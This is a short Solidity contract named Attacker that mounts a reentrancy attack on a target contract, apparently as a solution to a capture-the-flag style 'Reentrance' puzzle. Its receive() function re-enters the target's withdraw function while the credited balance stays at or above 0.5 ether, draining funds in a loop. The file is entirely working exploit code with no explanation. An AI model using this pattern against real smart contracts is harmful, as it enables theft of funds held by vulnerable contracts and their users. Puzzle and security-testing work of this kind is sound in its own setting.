pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Attacker {
    address payable reentranceContract;

    constructor(address payable _reenctraceContract) payable {
        reentranceContract = _reenctraceContract;
    }

    receive() external payable {
        if (balanceOf() >= 0.5 ether) {
            attack();
        }
    }

    function balanceOf() internal returns (uint256 balance) {
        bytes memory balanceOfPayload = abi.encodeWithSignature(
            "balanceOf(address)",
            address(this)
        );

        (bool result, bytes memory response) = address(reentranceContract).call(
            balanceOfPayload
        );

        return abi.decode(response, (uint256));
    }

    function attack() public {
        uint256 balance = balanceOf();
        console.log("got balance of ", balance);

        bytes memory withdrawPayload = abi.encodeWithSignature(
            "withdraw(uint256)",
            balance
        );

        (bool withdrawResult, ) = address(reentranceContract).call(
            withdrawPayload
        );
    }
}
